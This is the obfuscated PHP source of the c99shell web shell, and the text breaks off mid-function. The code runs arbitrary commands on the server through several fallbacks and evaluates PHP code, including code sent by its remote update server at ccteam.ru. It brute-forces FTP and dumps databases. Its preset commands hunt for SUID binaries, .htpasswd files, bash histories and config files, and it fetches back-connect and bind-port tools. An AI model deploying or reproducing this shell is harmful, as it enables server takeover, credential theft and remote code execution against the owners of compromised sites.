<?php
echo '[syslog]01
'; if (!function_exists('getmicrotime')) { function getmicrotime() { list($sp2a42d2, $spb2233d) = explode(' ', microtime()); return (double) $sp2a42d2 + (double) $spb2233d; } } error_reporting(5); $sp01e9c0 = strtolower(substr(PHP_OS, 0, 3)) == 'win'; define('starttime', getmicrotime()); if (get_magic_quotes_gpc()) { if (!function_exists('strips')) { function strips(&$sp662a5a, $sp71a197 = '') { if (is_array($sp662a5a)) { foreach ($sp662a5a as $sp71a197 => $spe2ff4f) { if (strtoupper($sp71a197) != 'GLOBALS') { strips($sp662a5a["{$sp71a197}"]); } } } else { $sp662a5a = stripslashes($sp662a5a); } } } strips($sp64e32a); } $_REQUEST = array_merge($_COOKIE, $_GET, $_POST); foreach ($_REQUEST as $sp71a197 => $spe2ff4f) { if (!isset(${$sp71a197})) { ${$sp71a197} = $spe2ff4f; } } $sp272375 = '1.0 pre-release build #13'; if (!empty($sp370010)) { setcookie('c99sh_surl'); $sp8c8b96 = ''; } elseif (!empty($spdb675f)) { $sp8c8b96 = $spdb675f; setcookie('c99sh_surl', $sp8c8b96); } else { $sp8c8b96 = $_REQUEST['c99sh_surl']; } $spbf8d26 = true; if ($spbf8d26 and !$_REQUEST['c99sh_surl']) { $sp101315 = '&'; foreach (explode('&', getenv('QUERY_STRING')) as $spe2ff4f) { $spe2ff4f = explode('=', $spe2ff4f); $sp19dd0c = urldecode($spe2ff4f[0]); $spc3da4d = urldecode($spe2ff4f[1]); foreach (array('http://', 'https://', 'ssl://', 'ftp://', '\\\\') as $sp75a0c8) { if (strpos($spc3da4d, $sp75a0c8) === 0) { $sp7ea19b .= urlencode($sp19dd0c) . '=' . urlencode($spc3da4d) . '&'; } } } if ($_REQUEST['surl_autofill_include']) { $sp7ea19b .= 'surl_autofill_include=1&'; } } if (empty($sp8c8b96)) { $sp8c8b96 = '?' . $sp7ea19b; } $sp8c8b96 = htmlspecialchars($sp8c8b96); $spd14c66 = 0; $spea63b2 = ''; $sp83677c = ''; $sp3f6088 = ''; $spfcdc1b = array('*'); $sp5aedb1 = 'Restricted area'; $spa72b80 = '<a href="http://ccteam.ru/releases/c99shell">c99shell v.' . $sp272375 . '</a>: access denied'; $spd2385e = true; $spbcda5a = false; echo '[syslog]02
'; $spaef29a = 'http://ccteam.ru/update/c99shell/'; $spb8b1c8 = 'http://ccteam.ru/files/c99sh_sources/'; $spfc68ef = true; $spcd837d = '<center><b>Owned by hacker</b></center>'; $sp09ad6d = array(''); $sp07714d = './'; $spbb76b1 = ''; $sp9d40fb = './'; $spf16714 = 'user@host.tld'; $sp952cfb = '0a'; $spd14eb0 = true; $spde4c45 = array('html' => array('html', 'htm', 'shtml'), 'txt' => array('txt', 'conf', 'bat', 'sh', 'js', 'bak', 'doc', 'log', 'sfc', 'cfg', 'htaccess'), 'exe' => array('sh', 'install', 'bat', 'cmd'), 'ini' => array('ini', 'inf'), 'code' => array('php', 'phtml', 'php3', 'php4', 'inc', 'tcl', 'h', 'c', 'cpp', 'py', 'cgi', 'pl'), 'img' => array('gif', 'png', 'jpeg', 'jfif', 'jpg', 'jpe', 'bmp', 'ico', 'tif', 'tiff', 'avi', 'mpg', 'mpeg'), 'sdb' => array('sdb'), 'phpsess' => array('sess'), 'download' => array('exe', 'com', 'pif', 'src', 'lnk', 'zip', 'rar', 'gz', 'tar')); $spb7a887 = array(getenv('PHPRC') . ' -q %f%' => array('php', 'php3', 'php4'), 'perl %f%' => array('pl', 'cgi')); $spdcaf8d = array(array(basename($_SERVER['PHP_SELF']), 1, '<font color="yellow">', '</font>'), array('config.php', 1)); $speedd37 = array('a'); $sp292a78 = 8; $sp8f9868 = 24; $spc1c534 = 100; $spc34646 = 'c99'; $spa5241a = '31373'; $speec795 = '31373'; $sp36f23d = '8081'; if (!$sp01e9c0) { $sp8ce7d0 = array(array('-----------------------------------------------------------', 'ls -la'), array('find all suid files', 'find / -type f -perm -04000 -ls'), array('find suid files in current dir', 'find . -type f -perm -04000 -ls'), array('find all sgid files', 'find / -type f -perm -02000 -ls'), array('find sgid files in current dir', 'find . -type f -perm -02000 -ls'), array('find config.inc.php files', 'find / -type f -name config.inc.php'), array('find config* files', 'find / -type f -name "config*"'), array('find config* files in current dir', 'find . -type f -name "config*"'), array('find all writable folders and files', 'find / -perm -2 -ls'), array('find all writable folders and files in current dir', 'find . -perm -2 -ls'), array('find all service.pwd files', 'find / -type f -name service.pwd'), array('find service.pwd files in current dir', 'find . -type f -name service.pwd'), array('find all .htpasswd files', 'find / -type f -name .htpasswd'), array('find .htpasswd files in current dir', 'find . -type f -name .htpasswd'), array('find all .bash_history files', 'find / -type f -name .bash_history'), array('find .bash_history files in current dir', 'find . -type f -name .bash_history'), array('find all .fetchmailrc files', 'find / -type f -name .fetchmailrc'), array('find .fetchmailrc files in current dir', 'find . -type f -name .fetchmailrc'), array('list file attributes on a Linux second extended file system', 'lsattr -va'), array('show opened ports', 'netstat -an | grep -i listen')); } else { $sp8ce7d0 = array(array('-----------------------------------------------------------', 'dir'), array('show opened ports', 'netstat -an')); } $sp20d1dc = 'c99shvars'; $spe9e736 = true; $sp707446 = false; $sp1651c7 = array(array('<img src="' . $sp8c8b96 . 'act=img&img=home" alt="Home" height="20" width="20" border="0">', $sp8c8b96), array('<img src="' . $sp8c8b96 . 'act=img&img=back" alt="Back" height="20" width="20" border="0">', '#" onclick="history.back(1)'), array('<img src="' . $sp8c8b96 . 'act=img&img=forward" alt="Forward" height="20" width="20" border="0">', '#" onclick="history.go(1)'), array('<img src="' . $sp8c8b96 . 'act=img&img=up" alt="UPDIR" height="20" width="20" border="0">', $sp8c8b96 . 'act=ls&d=%upd&sort=%sort'), array('<img src="' . $sp8c8b96 . 'act=img&img=refresh" alt="Refresh" height="20" width="17" border="0">', ''), array('<img src="' . $sp8c8b96 . 'act=img&img=search" alt="Search" height="20" width="20" border="0">', $sp8c8b96 . 'act=search&d=%d'), array('<img src="' . $sp8c8b96 . 'act=img&img=buffer" alt="Buffer" height="20" width="20" border="0">', $sp8c8b96 . 'act=fsbuff&d=%d'), array('<b>Encoder</b>', $sp8c8b96 . 'act=encoder&d=%d'), array('<b>Tools</b>', $sp8c8b96 . 'act=tools&d=%d'), array('<b>Proc.</b>', $sp8c8b96 . 'act=processes&d=%d'), array('<b>FTP brute</b>', $sp8c8b96 . 'act=ftpquickbrute&d=%d'), array('<b>Sec.</b>', $sp8c8b96 . 'act=security&d=%d'), array('<b>SQL</b>', $sp8c8b96 . 'act=sql&d=%d'), array('<b>PHP-code</b>', $sp8c8b96 . 'act=eval&d=%d'), array('<b>Update</b>', $sp8c8b96 . 'act=update&d=%d'), array('<b>Feedback</b>', $sp8c8b96 . 'act=feedback&d=%d'), array('<b>Self remove</b>', $sp8c8b96 . 'act=selfremove'), array('<b>Logout</b>', '#" onclick="if (confirm(\'Are you sure?\')) window.close()')); $sp11f53b = '#c0c0c0'; $spc02858 = '#FFFFFF'; $sp8a72d5 = '#6A6A6A'; $sp3775ba = '#0000BB'; $sp6a5c24 = '#1300FF'; $spd04372 = '#007700'; $sp3cb2d1 = '#000000'; @($sp224638 = $_REQUEST['f']); @extract($_REQUEST['c99shcook']); $sped1c3a = array(); foreach ($spfcdc1b as $sp71a197 => $spe2ff4f) { $sped1c3a[] = str_replace('\\*', '.*', preg_quote($spe2ff4f)); } $sp676578 = '!^(' . implode('|', $sped1c3a) . ')$!i'; if (!preg_match($sp676578, getenv('REMOTE_ADDR')) and !preg_match($sp676578, gethostbyaddr(getenv('REMOTE_ADDR')))) { die('<a href="http://ccteam.ru/releases/cc99shell">c99shell</a>: Access Denied - your host (' . getenv('REMOTE_ADDR') . ') not allow'); } if (!empty($spea63b2)) { if (empty($sp3f6088)) { $sp3f6088 = md5($sp83677c); } if ($_SERVER['PHP_AUTH_USER'] != $spea63b2 or md5($_SERVER['PHP_AUTH_PW']) != $sp3f6088) { if (empty($sp5aedb1)) { $sp5aedb1 = strip_tags(ereg_replace('&nbsp;|<br>', ' ', $spcd837d)); } header('WWW-Authenticate: Basic realm="c99shell ' . $sp272375 . ': ' . $sp5aedb1 . '"'); header('HTTP/1.0 401 Unauthorized'); die($spa72b80); } } if ($spe3b8cc != 'img') { $sp5f015d = realpath('.'); chdir($sp07714d); if ($sp318634 or $spbcda5a) { @ob_clean(); c99sh_getupdate($sp318634, 1); die; } $spc8cb58 = unserialize($_COOKIE["{$sp20d1dc}"]); if (!is_array($spc8cb58)) { $spc8cb58 = array(); } if (!is_array($spc8cb58['copy'])) { $spc8cb58['copy'] = array(); } if (!is_array($spc8cb58['cut'])) { $spc8cb58['cut'] = array(); } $sp7c1f07 = @ini_get('disable_functions'); if (!empty($sp7c1f07)) { $sp7c1f07 = str_replace(' ', '', $sp7c1f07); $sp7c1f07 = explode(',', $sp7c1f07); } if (!function_exists('c99_buff_prepare')) { function c99_buff_prepare() { global $spc8cb58; global $spe3b8cc; foreach ($spc8cb58['copy'] as $sp71a197 => $spe2ff4f) { $spc8cb58['copy'][$sp71a197] = str_replace('\\', DIRECTORY_SEPARATOR, realpath($spe2ff4f)); } foreach ($spc8cb58['cut'] as $sp71a197 => $spe2ff4f) { $spc8cb58['cut'][$sp71a197] = str_replace('\\', DIRECTORY_SEPARATOR, realpath($spe2ff4f)); } $spc8cb58['copy'] = array_unique($spc8cb58['copy']); $spc8cb58['cut'] = array_unique($spc8cb58['cut']); sort($spc8cb58['copy']); sort($spc8cb58['cut']); if ($spe3b8cc != 'copy') { foreach ($spc8cb58['cut'] as $sp71a197 => $spe2ff4f) { if ($spc8cb58['copy'][$sp71a197] == $spe2ff4f) { unset($spc8cb58['copy'][$sp71a197]); } } } else { foreach ($spc8cb58['copy'] as $sp71a197 => $spe2ff4f) { if ($spc8cb58['cut'][$sp71a197] == $spe2ff4f) { unset($spc8cb58['cut'][$sp71a197]); } } } } } c99_buff_prepare(); if (!function_exists('c99_sess_put')) { function c99_sess_put($spabbf84) { global $sp20d1dc; global $spc8cb58; c99_buff_prepare(); $spc8cb58 = $spabbf84; $spabbf84 = serialize($spabbf84); setcookie($sp20d1dc, $spabbf84); } } foreach (array('sort', 'sql_sort') as $spe2ff4f) { if (!empty($_GET[$spe2ff4f])) { ${$spe2ff4f} = $_GET[$spe2ff4f]; } if (!empty($_POST[$spe2ff4f])) { ${$spe2ff4f} = $_POST[$spe2ff4f]; } } if ($spd14eb0) { if (!empty($sp946414)) { setcookie('sort', $sp946414); } if (!empty($sp6b797c)) { setcookie('sql_sort', $sp6b797c); } } if (!function_exists('str2mini')) { function str2mini($sp1c78b4, $spb072fb) { if (strlen($sp1c78b4) > $spb072fb) { $spb072fb = ceil($spb072fb / 2) - 2; return substr($sp1c78b4, 0, $spb072fb) . '...' . substr($sp1c78b4, -$spb072fb); } else { return $sp1c78b4; } } } if (!function_exists('view_size')) { function view_size($sp92ea66) { if (!is_numeric($sp92ea66)) { return false; } else { if ($sp92ea66 >= 1073741824) { $sp92ea66 = round($sp92ea66 / 1073741824 * 100) / 100 . ' GB'; } elseif ($sp92ea66 >= 1048576) { $sp92ea66 = round($sp92ea66 / 1048576 * 100) / 100 . ' MB'; } elseif ($sp92ea66 >= 1024) { $sp92ea66 = round($sp92ea66 / 1024 * 100) / 100 . ' KB'; } else { $sp92ea66 = $sp92ea66 . ' B'; } return $sp92ea66; } } } if (!function_exists('fs_copy_dir')) { function fs_copy_dir($sp6bf0a4, $spbcfcd6) { $sp6bf0a4 = str_replace('\\', DIRECTORY_SEPARATOR, $sp6bf0a4); if (substr($sp6bf0a4, -1) != DIRECTORY_SEPARATOR) { $sp6bf0a4 .= DIRECTORY_SEPARATOR; } $sp4431a3 = opendir($sp6bf0a4); while (($spf60383 = readdir($sp4431a3)) !== false) { if ($spf60383 != '.' and $spf60383 != '..') { if (!is_dir($sp6bf0a4 . DIRECTORY_SEPARATOR . $spf60383)) { $spe6a02a = copy($sp6bf0a4 . DIRECTORY_SEPARATOR . $spf60383, $spbcfcd6 . DIRECTORY_SEPARATOR . $spf60383); } else { $spe6a02a = mkdir($spbcfcd6 . DIRECTORY_SEPARATOR . $spf60383); fs_copy_dir($sp6bf0a4 . DIRECTORY_SEPARATOR . $spf60383, $spbcfcd6 . DIRECTORY_SEPARATOR . $spf60383); } if (!$spe6a02a) { return $spe6a02a; } } } closedir($sp4431a3); return true; } } if (!function_exists('fs_copy_obj')) { function fs_copy_obj($sp6bf0a4, $spbcfcd6) { $sp6bf0a4 = str_replace('\\', DIRECTORY_SEPARATOR, $sp6bf0a4); $spbcfcd6 = str_replace('\\', DIRECTORY_SEPARATOR, $spbcfcd6); if (!is_dir(dirname($spbcfcd6))) { mkdir(dirname($spbcfcd6)); } if (is_dir($sp6bf0a4)) { if (substr($sp6bf0a4, -1) != DIRECTORY_SEPARATOR) { $sp6bf0a4 .= DIRECTORY_SEPARATOR; } if (substr($spbcfcd6, -1) != DIRECTORY_SEPARATOR) { $spbcfcd6 .= DIRECTORY_SEPARATOR; } return fs_copy_dir($sp6bf0a4, $spbcfcd6); } elseif (is_file($sp6bf0a4)) { return copy($sp6bf0a4, $spbcfcd6); } else { return false; } } } if (!function_exists('fs_move_dir')) { function fs_move_dir($sp6bf0a4, $spbcfcd6) { $sp4431a3 = opendir($sp6bf0a4); if (!is_dir($spbcfcd6)) { mkdir($spbcfcd6); } while (($spf60383 = readdir($sp4431a3)) !== false) { if ($spf60383 != '.' and $spf60383 != '..') { $spe6a02a = true; if (!is_dir($sp6bf0a4 . DIRECTORY_SEPARATOR . $spf60383)) { $spe6a02a = copy($sp6bf0a4 . DIRECTORY_SEPARATOR . $spf60383, $spbcfcd6 . DIRECTORY_SEPARATOR . $spf60383); } else { if (mkdir($spbcfcd6 . DIRECTORY_SEPARATOR . $spf60383) and fs_copy_dir($sp6bf0a4 . DIRECTORY_SEPARATOR . $spf60383, $spbcfcd6 . DIRECTORY_SEPARATOR . $spf60383)) { $spe6a02a = false; } } if (!$spe6a02a) { return $spe6a02a; } } } closedir($sp4431a3); return true; } } if (!function_exists('fs_move_obj')) { function fs_move_obj($sp6bf0a4, $spbcfcd6) { $sp6bf0a4 = str_replace('\\', DIRECTORY_SEPARATOR, $sp6bf0a4); $spbcfcd6 = str_replace('\\', DIRECTORY_SEPARATOR, $spbcfcd6); if (is_dir($sp6bf0a4)) { if (substr($sp6bf0a4, -1) != DIRECTORY_SEPARATOR) { $sp6bf0a4 .= DIRECTORY_SEPARATOR; } if (substr($spbcfcd6, -1) != DIRECTORY_SEPARATOR) { $spbcfcd6 .= DIRECTORY_SEPARATOR; } return fs_move_dir($sp6bf0a4, $spbcfcd6); } elseif (is_file($sp6bf0a4)) { if (copy($sp6bf0a4, $spbcfcd6)) { return unlink($sp6bf0a4); } else { unlink($spbcfcd6); return false; } } else { return false; } } } if (!function_exists('fs_rmdir')) { function fs_rmdir($sp6bf0a4) { $sp4431a3 = opendir($sp6bf0a4); while (($spf60383 = readdir($sp4431a3)) !== false) { if ($spf60383 != '.' and $spf60383 != '..') { if (!is_dir($sp6bf0a4 . $spf60383)) { unlink($sp6bf0a4 . $spf60383); } else { fs_rmdir($sp6bf0a4 . $spf60383 . DIRECTORY_SEPARATOR); rmdir($sp6bf0a4 . $spf60383); } } } closedir($sp4431a3); rmdir($sp6bf0a4); return !is_dir($sp6bf0a4); } } if (!function_exists('fs_rmobj')) { function fs_rmobj($spf60383) { $spf60383 = str_replace('\\', DIRECTORY_SEPARATOR, $spf60383); if (is_dir($spf60383)) { if (substr($spf60383, -1) != DIRECTORY_SEPARATOR) { $spf60383 .= DIRECTORY_SEPARATOR; } return fs_rmdir($spf60383); } elseif (is_file($spf60383)) { return unlink($spf60383); } else { return false; } } } if (!function_exists('myshellexec')) { function myshellexec($sp7bd36a) { global $sp7c1f07; $spea30d5 = ''; if (!empty($sp7bd36a)) { if (is_callable('exec') and !in_array('exec', $sp7c1f07)) { exec($sp7bd36a, $spea30d5); $spea30d5 = join('
', $spea30d5); } elseif (($spea30d5 = `{$sp7bd36a}`) !== false) { } elseif (is_callable('system') and !in_array('system', $sp7c1f07)) { $spe2ff4f = @ob_get_contents(); @ob_clean(); system($sp7bd36a); $spea30d5 = @ob_get_contents(); @ob_clean(); echo $spe2ff4f; } elseif (is_callable('passthru') and !in_array('passthru', $sp7c1f07)) { $spe2ff4f = @ob_get_contents(); @ob_clean(); passthru($sp7bd36a); $spea30d5 = @ob_get_contents(); @ob_clean(); echo $spe2ff4f; } elseif (is_resource($sp694629 = popen($sp7bd36a, 'r'))) { $spea30d5 = ''; while (!feof($sp694629)) { $spea30d5 .= fread($sp694629, 1024); } pclose($sp694629); } } return $spea30d5; } } if (!function_exists('tabsort')) { function tabsort($sp5955cc, $sp873f91) { global $spe2ff4f; return strnatcmp($sp5955cc[$spe2ff4f], $sp873f91[$spe2ff4f]); } } if (!function_exists('view_perms')) { function view_perms($sp9dace2) { if (($sp9dace2 & 49152) === 49152) { $spb06e63 = 's'; } elseif (($sp9dace2 & 16384) === 16384) { $spb06e63 = 'd'; } elseif (($sp9dace2 & 40960) === 40960) { $spb06e63 = 'l'; } elseif (($sp9dace2 & 32768) === 32768) { $spb06e63 = '-'; } elseif (($sp9dace2 & 24576) === 24576) { $spb06e63 = 'b'; } elseif (($sp9dace2 & 8192) === 8192) { $spb06e63 = 'c'; } elseif (($sp9dace2 & 4096) === 4096) { $spb06e63 = 'p'; } else { $spb06e63 = '?'; } $sp0581a1['read'] = $sp9dace2 & 256 ? 'r' : '-'; $sp0581a1['write'] = $sp9dace2 & 128 ? 'w' : '-'; $sp0581a1['execute'] = $sp9dace2 & 64 ? 'x' : '-'; $spbaefbe['read'] = $sp9dace2 & 32 ? 'r' : '-'; $spbaefbe['write'] = $sp9dace2 & 16 ? 'w' : '-'; $spbaefbe['execute'] = $sp9dace2 & 8 ? 'x' : '-'; $spa53dc9['read'] = $sp9dace2 & 4 ? 'r' : '-'; $spa53dc9['write'] = $sp9dace2 & 2 ? 'w' : '-'; $spa53dc9['execute'] = $sp9dace2 & 1 ? 'x' : '-'; if ($sp9dace2 & 2048) { $sp0581a1['execute'] = $sp0581a1['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 1024) { $spbaefbe['execute'] = $spbaefbe['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 512) { $spa53dc9['execute'] = $spa53dc9['execute'] == 'x' ? 't' : 'T'; } return $spb06e63 . join('', $sp0581a1) . join('', $spbaefbe) . join('', $spa53dc9); } } if (!function_exists('posix_getpwuid') and !in_array('posix_getpwuid', $sp7c1f07)) { function posix_getpwuid($spca6b76) { return false; } } if (!function_exists('posix_getgrgid') and !in_array('posix_getgrgid', $sp7c1f07)) { function posix_getgrgid($spba592d) { return false; } } if (!function_exists('posix_kill') and !in_array('posix_kill', $sp7c1f07)) { function posix_kill($spba592d) { return false; } } if (!function_exists('parse_perms')) { function parse_perms($sp9dace2) { if (($sp9dace2 & 49152) === 49152) { $spbcfcd6 = 's'; } elseif (($sp9dace2 & 16384) === 16384) { $spbcfcd6 = 'd'; } elseif (($sp9dace2 & 40960) === 40960) { $spbcfcd6 = 'l'; } elseif (($sp9dace2 & 32768) === 32768) { $spbcfcd6 = '-'; } elseif (($sp9dace2 & 24576) === 24576) { $spbcfcd6 = 'b'; } elseif (($sp9dace2 & 8192) === 8192) { $spbcfcd6 = 'c'; } elseif (($sp9dace2 & 4096) === 4096) { $spbcfcd6 = 'p'; } else { $spbcfcd6 = '?'; } $spf60383['r'] = ($sp9dace2 & 256) > 0; $spf60383['w'] = ($sp9dace2 & 128) > 0; $spf60383['x'] = ($sp9dace2 & 64) > 0; $spb99780['r'] = ($sp9dace2 & 32) > 0; $spb99780['w'] = ($sp9dace2 & 16) > 0; $spb99780['x'] = ($sp9dace2 & 8) > 0; $sp1cf12d['r'] = ($sp9dace2 & 4) > 0; $sp1cf12d['w'] = ($sp9dace2 & 2) > 0; $sp1cf12d['x'] = ($sp9dace2 & 1) > 0; return array('t' => $spbcfcd6, 'o' => $spf60383, 'g' => $spb99780, 'w' => $sp1cf12d); } } if (!function_exists('parsesort')) { function parsesort($sp946414) { $sp47c00d = intval($sp946414); $sp764002 = substr($sp946414, -1); if ($sp764002 != 'd') { $sp764002 = 'a'; } return array($sp47c00d, $sp764002); } } if (!function_exists('view_perms_color')) { function view_perms_color($spf60383) { if (!is_readable($spf60383)) { return '<font color=red>' . view_perms(fileperms($spf60383)) . '</font>'; } elseif (!is_writable($spf60383)) { return '<font color=white>' . view_perms(fileperms($spf60383)) . '</font>'; } else { return '<font color=green>' . view_perms(fileperms($spf60383)) . '</font>'; } } } if (!function_exists('c99getsource')) { function c99getsource($sp3fb904) { global $spb8b1c8; $sp6dfc07 = array('c99sh_bindport.pl' => 'c99sh_bindport_pl.txt', 'c99sh_bindport.c' => 'c99sh_bindport_c.txt', 'c99sh_backconn.pl' => 'c99sh_backconn_pl.txt', 'c99sh_backconn.c' => 'c99sh_backconn_c.txt', 'c99sh_datapipe.pl' => 'c99sh_datapipe_pl.txt', 'c99sh_datapipe.c' => 'c99sh_datapipe_c.txt'); $sp19dd0c = $sp6dfc07[$sp3fb904]; if ($sp19dd0c) { return file_get_contents($spb8b1c8 . $sp19dd0c); } else { return false; } } } if (!function_exists('c99sh_getupdate')) { function c99sh_getupdate($sp407833 = true) { $sp884331 = $sp64e32a['c99sh_updateurl'] . '?version=' . urlencode(base64_encode($sp64e32a['shver'])) . '&updatenow=' . ($spbcda5a ? '1' : '0') . '&'; $spabbf84 = @file_get_contents($sp884331); if (!$spabbf84) { return 'Can\'t connect to update-server!'; } else { $spabbf84 = ltrim($spabbf84); $sp5ecd68 = substr($spabbf84, 3, ord($spabbf84[2])); if ($spabbf84[0] == '™' and $spabbf84[1] == '') { return 'Error: ' . $sp5ecd68; return false; } if ($spabbf84[0] == '™' and $spabbf84[1] == '') { return 'You are using latest version!'; } if ($spabbf84[0] == '™' and $spabbf84[1] == '') { $sp5ecd68 = explode('', $sp5ecd68); if ($sp407833) { $sp638aee = array(); $sp1cc9dc = $sp5ecd68[0]; $sp636dab = file_get_contents($sp1cc9dc); if (!$sp636dab) { return 'Can\'t fetch update!'; } else { $sp694629 = fopen(__FILE__, 'w'); if (!$sp694629) { return 'Local error: can\'t write update to ' . __FILE__ . '! You may download c99shell.php manually <a href="' . $sp1cc9dc . '"><u>here</u></a>.'; } else { fwrite($sp694629, $sp636dab); fclose($sp694629); return 'Thanks! Updated with success.'; } } } else { return 'New version are available: ' . $sp5ecd68[1]; } } elseif ($spabbf84[0] == '™' and $spabbf84[1] == '') { eval($sp5ecd68); return 1; } else { return 'Error in protocol: segmentation failed! (' . $spabbf84 . ') '; } } } } if (!function_exists('mysql_dump')) { function mysql_dump($sp9faf1f) { global $sp272375; $spfe78c5 = $sp9faf1f['sock']; $sp7a8f47 = $sp9faf1f['db']; $sp4e54cb = $sp9faf1f['print']; $sp6907a8 = $sp9faf1f['nl2br']; $spa3ecf0 = $sp9faf1f['file']; $sp2f1819 = $sp9faf1f['add_drop']; $sp3bcdc6 = $sp9faf1f['tabs']; $spfaaa75 = $sp9faf1f['onlytabs']; $spe6a02a = array(); $spe6a02a['err'] = array(); if (!is_resource($spfe78c5)) { echo 'Error: $sock is not valid resource.'; } if (empty($sp7a8f47)) { $sp7a8f47 = 'db'; } if (empty($sp4e54cb)) { $sp4e54cb = 0; } if (empty($sp6907a8)) { $sp6907a8 = 0; } if (empty($sp2f1819)) { $sp2f1819 = true; } if (empty($spa3ecf0)) { $spa3ecf0 = $spbb76b1 . 'dump_' . getenv('SERVER_NAME') . '_' . $sp7a8f47 . '_' . date('d-m-Y-H-i-s') . '.sql'; } if (!is_array($sp3bcdc6)) { $sp3bcdc6 = array(); } if (empty($sp2f1819)) { $sp2f1819 = true; } if (sizeof($sp3bcdc6) == 0) { $spfd181b = mysql_query('SHOW TABLES FROM ' . $sp7a8f47, $spfe78c5); if (mysql_num_rows($spfd181b) > 0) { while ($spa53ce4 = mysql_fetch_row($spfd181b)) { $sp3bcdc6[] = $spa53ce4[0]; } } } $sp7a2456 = '# Dumped by C99Shell.SQL v. ' . $sp272375 . '
# Home page: http://ccteam.ru
#
# Host settings:
# MySQL version: (' . mysql_get_server_info() . ') running on ' . getenv('SERVER_ADDR') . ' (' . getenv('SERVER_NAME') . ')' . '
# Date: ' . date('d.m.Y H:i:s') . '
# DB: "' . $sp7a8f47 . '"
#---------------------------------------------------------
'; $sp76d016 = count($spfaaa75); foreach ($sp3bcdc6 as $sp0b0ef0) { if (in_array($sp0b0ef0, $spfaaa75) or !$sp76d016) { if ($sp2f1819) { $sp7a2456 .= 'DROP TABLE IF EXISTS `' . $sp0b0ef0 . '`;
'; } $spfd181b = mysql_query('SHOW CREATE TABLE `' . $sp0b0ef0 . '`', $spfe78c5); if (!$spfd181b) { $spe6a02a['err'][] = mysql_smarterror(); } else { $spa53ce4 = mysql_fetch_row($spfd181b); $sp7a2456 .= $spa53ce4['1'] . ';

'; $spfd181b = mysql_query("SELECT * FROM `{$sp0b0ef0}`", $spfe78c5); if (mysql_num_rows($spfd181b) > 0) { while ($spa53ce4 = mysql_fetch_assoc($spfd181b)) { $spa22ace = implode('`, `', array_keys($spa53ce4)); $spe99d03 = array_values($spa53ce4); foreach ($spe99d03 as $sp71a197 => $spe2ff4f) { $spe99d03[$sp71a197] = addslashes($spe2ff4f); } $spe99d03 = implode('\', \'', $spe99d03); $spabcb3f = "INSERT INTO `{$sp0b0ef0}`(`" . $spa22ace . '`) VALUES (\'' . $spe99d03 . '\');
'; $sp7a2456 .= $spabcb3f; } } } } } $sp7a2456 .= '#---------------------------------------------------------------------------------

'; if ($spa3ecf0) { $sp694629 = fopen($spa3ecf0, 'w'); if (!$sp694629) { $spe6a02a['err'][] = 2; } else { fwrite($sp694629, $sp7a2456); fclose($sp694629); } } if ($sp4e54cb) { if ($sp6907a8) { echo nl2br($sp7a2456); } else { echo $sp7a2456; } } return $sp7a2456; } } if (!function_exists('mysql_buildwhere')) { function mysql_buildwhere($sp6dfc07, $sp7cedfc = ' and', $spd24b78 = array()) { if (!is_array($sp6dfc07)) { $sp6dfc07 = array(); } $spea30d5 = ''; foreach ($sp6dfc07 as $sp71a197 => $spe2ff4f) { $spc3da4d = ''; if (!empty($spd24b78[$sp71a197])) { $spc3da4d .= $spd24b78[$sp71a197] . '('; } $spc3da4d .= '\'' . addslashes($spe2ff4f) . '\''; if (!empty($spd24b78[$sp71a197])) { $spc3da4d .= ')'; } $spea30d5 .= '`' . $sp71a197 . '` = ' . $spc3da4d . $sp7cedfc; } $spea30d5 = substr($spea30d5, 0, strlen($spea30d5) - strlen($sp7cedfc)); return $spea30d5; } } if (!function_exists('mysql_fetch_all')) { function mysql_fetch_all($spd2724c, $spfe78c5) { if ($spfe78c5) { $spea30d5 = mysql_query($spd2724c, $spfe78c5); } else { $spea30d5 = mysql_query($spd2724c); } $sp6dfc07 = array(); while ($spa53ce4 = mysql_fetch_array($spea30d5)) { $sp6dfc07[] = $spa53ce4; } mysql_free_result($spea30d5); return $sp6dfc07; } } if (!function_exists('mysql_smarterror')) { function mysql_smarterror($spb06e63, $spfe78c5) { if ($spfe78c5) { $spf785f6 = mysql_error($spfe78c5); } else { $spf785f6 = mysql_error(); } $spf785f6 = htmlspecialchars($spf785f6); return $spf785f6; } } if (!function_exists('mysql_query_form')) { function mysql_query_form() { global $spff71ed, $spe49285, $sp6f7371, $sp2c2b28, $sp3bfc64, $sped0b21, $spd370ce; if ($spff71ed and !$sp2c2b28 and $sp3bfc64) { if (!$sped0b21) { $sped0b21 = 'Query was empty'; } echo '<b>Error:</b> <br>' . $sped0b21 . '<br>'; } if ($sp2c2b28 or !$sp3bfc64) { $spe49285 = $sp38ecac; } if (!$spff71ed or $spe49285) { echo '<table border=0><tr><td><form name="c99sh_sqlquery" method=POST><b>'; if ($sp6f7371 and !$spff71ed) { echo 'Do you really want to'; } else { echo 'SQL-Query'; } echo ':</b><br><br><textarea name=sql_query cols=100 rows=10>' . htmlspecialchars($sp6f7371) . '</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value="' . htmlspecialchars($spb19fa4) . '"><input type=hidden name=submit value="1"><input type=hidden name="sql_goto" value="' . htmlspecialchars($sp38ecac) . '"><input type=submit name=sql_confirm value="Yes">&nbsp;<input type=submit value="No"></form></td>'; if ($spd370ce) { echo '<td valign="top"><b>Fields:</b><br>'; foreach ($spd370ce as $spb5262f) { $sp19dd0c = $spb5262f['Field']; echo 'Â» <a href="#" onclick="document.c99sh_sqlquery.sql_query.value+=\'`' . $sp19dd0c . '`\';"><b>' . $sp19dd0c . '</b></a><br>'; } echo '</td></tr></table>'; } } if ($sp2c2b28 or !$sp3bfc64) { $sp6f7371 = $spcea538; } } } if (!function_exists('mysql_create_db')) { function mysql_create_db($sp7a8f47, $spfe78c5 = '') { $spabcb3f = 'CREATE DATABASE `' . addslashes($sp7a8f47) . '`;'; if ($spfe78c5) { return mysql_query($spabcb3f, $spfe78c5); } else { return mysql_query($spabcb3f); } } } if (!function_exists('mysql_query_parse')) { function mysql_query_parse($spd2724c) { $spd2724c = trim($spd2724c); $sp662a5a = explode(' ', $spd2724c); $sp59f170 = array('SELECT' => array(3, 1), 'SHOW' => array(2, 1), 'DELETE' => array(1), 'DROP' => array(1)); $spea30d5 = array(); $spe4e00a = strtoupper($sp662a5a[0]); if (is_array($sp59f170[$spe4e00a])) { $spea30d5['propertions'] = $sp59f170[$spe4e00a]; $spea30d5['query'] = $spd2724c; if ($sp59f170[$spe4e00a] == 2) { foreach ($sp662a5a as $sp71a197 => $spe2ff4f) { if 